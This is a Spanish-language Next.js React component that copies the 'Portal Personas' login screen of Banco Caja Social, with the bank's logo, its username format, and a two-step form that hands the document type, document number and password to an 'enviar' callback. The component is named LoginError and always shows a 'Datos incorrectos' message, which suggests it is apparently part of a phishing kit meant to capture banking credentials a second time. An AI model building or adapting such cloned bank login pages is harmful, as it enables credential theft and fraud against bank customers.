/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

import LoaderFullScreen from "./LoaderFullScreen";

type UserPrefix = "CC" | "CE" | "NI" | "TI" | "PE";

interface LoginCajaSocialProps {
  enviar?: (data: { tipoDocumento: UserPrefix; numeroDocumento: string; password: string }) => void;
}

export default function LoginError({ enviar }: LoginCajaSocialProps) {
  const [step, setStep] = useState<"username" | "password">("username");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [userError, setUserError] = useState(false);
  const [passError, setPassError] = useState(false);
  const [loading, setLoading] = useState(false);

  // Regex estricta: Prefijo exacto + 1 o más dígitos
  const isValidUsername = (value: string): boolean => {
    const regex = /^(CC|CE|NI|TI|PE)\d+$/;
    return regex.test(value.toUpperCase());
  };

  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.toUpperCase();
    setUsername(raw);

    if (raw.length === 0) {
      setUserError(false);
      return;
    }

    // Validamos prefijos válidos
    const validPrefixes = ["CC", "CE", "NI", "TI", "PE"];
    const currentPrefix = raw.substring(0, 2);

    // Lógica de error:
    // 1. Si ya tiene 2 o más letras y el prefijo no está en la lista.
    // 2. Si tiene más de 2 caracteres y lo que sigue después del prefijo NO son números.
    if (raw.length >= 2) {
      const isInvalidPrefix = !validPrefixes.includes(currentPrefix);
      const hasNonDigitsAfter = !/^\d*$/.test(raw.substring(2));

      setUserError(isInvalidPrefix || hasNonDigitsAfter);
    } else {
      // Mientras escribe la primera letra, validamos que sea una de las iniciales posibles (C, N, T, P)
      setUserError(!/^[CNTP]/.test(raw));
    }
  };

  const handleNext = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!isValidUsername(username)) {
      setUserError(true);
      return;
    }
    setUserError(false);
    setStep("password");
  };

  const handleLogin = async (e?: React.FormEvent) => {
    e?.preventDefault();
    if (password.trim() === "") {
      setPassError(true);
      return;
    }
    setLoading(true);

    const prefix = username.substring(0, 2) as UserPrefix;
    const number = username.substring(2);

    if (enviar) {
      await enviar({ tipoDocumento: prefix, numeroDocumento: number, password });
      setLoading(false);
    } else {
      setTimeout(() => setLoading(false), 1500);
    }
  };

  return (
    <>
      <LoaderFullScreen visible={loading} />
      <div className="flex min-h-screen bg-white font-sans text-[#333]">

        {/* IZQUIERDA: IMAGEN */}
        <div className="hidden lg:block w-1/2 relative">
          <img
            src="/cajasocial/background-2.png"
            alt="Fondo"
            className="absolute inset-0 w-full h-full object-cover"
          />
        </div>

        {/* DERECHA: FORM */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 md:p-16 lg:p-24">
          <div className="w-full max-w-[440px]">

            <div className="mb-10">
              <img
                src="/cajasocial/logoBCSLine.svg"
                alt="Banco Caja Social"
                className="h-[50px] w-auto"
              />
            </div>

            <h1 className="text-[32px] font-bold text-[#222] mb-4 leading-tight">
              Bienvenido al Portal Personas
            </h1>

            <p className="text-[14px] text-[#555] mb-8 leading-relaxed">
              Recuerde que su usuario está compuesto por su Tipo de Identificación
              <strong className="text-[#222]"> (CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.
            </p>

            <form onSubmit={step === "username" ? handleNext : handleLogin}>
              {step === "username" ? (
                <div className="space-y-6">
                  <div>
                    <label className="block text-[14px] font-bold mb-2 text-[#333]">

                      <strong className="text-black">Usuario</strong>
                    </label>
                    <input
                      type="text"
                      value={username}
                      onChange={handleUsernameChange}
                      className={`w-full px-4 py-[12px] border rounded-[8px] focus:outline-none text-[16px] transition-all
                        ${userError ? 'border-[#d93025] bg-[#fffcfb]' : 'border-[#aeb4b9] focus:border-[#00548d]'}
                      `}
                      autoFocus
                    />

                    <div className="mt-2 min-h-[45px]">
                      <p className="text-[13px] text-[#6b7280]">Ejemplo: CC1234567890</p>
                      <p className="text-[13px] text-[#d93025] mt-1 font-medium">
                        Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center justify-between pt-2">
                    <button
                      type="submit"
                      disabled={!isValidUsername(username)}
                      className={`px-10 py-[12px] rounded-[25px] font-bold text-[15px] transition-all
                        ${isValidUsername(username)
                          ? 'bg-[#00548d] text-white hover:bg-[#003d66]'
                          : 'bg-[#cfd6db] text-[#8e979f] cursor-not-allowed'}
                      `}
                    >
                      Siguiente
                    </button>

                    <button type="button" className="text-[#0070c0] font-bold text-[14px] flex items-center gap-1 hover:underline">
                      ¿Olvidó su contraseña? <span className="text-[10px]">▼</span>
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-6 animate-in fade-in slide-in-from-right-4 duration-300">
                  <div>
                    <label className="block text-[14px] font-bold mb-2 text-[#333]">Contraseña</label>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        setPassError(false);
                      }}
                      className={`w-full px-4 py-[12px] border rounded-[8px] focus:outline-none text-[16px]
                        ${passError ? 'border-[#d93025]' : 'border-[#aeb4b9] focus:border-[#00548d]'}
                      `}
                      autoFocus
                    />
                    {passError && (
                      <p className="text-[13px] text-[#d93025] mt-1 font-medium">La contraseña es obligatoria.</p>
                    )}
                  </div>

                  <div className="flex gap-4 pt-2">
                    <button
                      type="button"
                      onClick={() => setStep("username")}
                      className="flex-1 py-[12px] border border-[#00548d] text-[#00548d] rounded-[25px] font-bold text-[15px]"
                    >
                      Volver
                    </button>
                    <button
                      type="submit"
                      disabled={password.trim() === ""}
                      className="flex-1 py-[12px] bg-[#00548d] text-white rounded-[25px] font-bold text-[15px] disabled:bg-[#cfd6db] disabled:text-[#8e979f]"
                    >
                      Ingresar
                    </button>
                  </div>
                </div>
              )}
            </form>

            <div className="mt-16 pt-8 border-t border-gray-100 text-[14px]">
              <span className="text-gray-600">¿Es un cliente nuevo?</span>
              <button type="button" className="text-[#0070c0] font-bold hover:underline ml-1">
                Registrarse
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}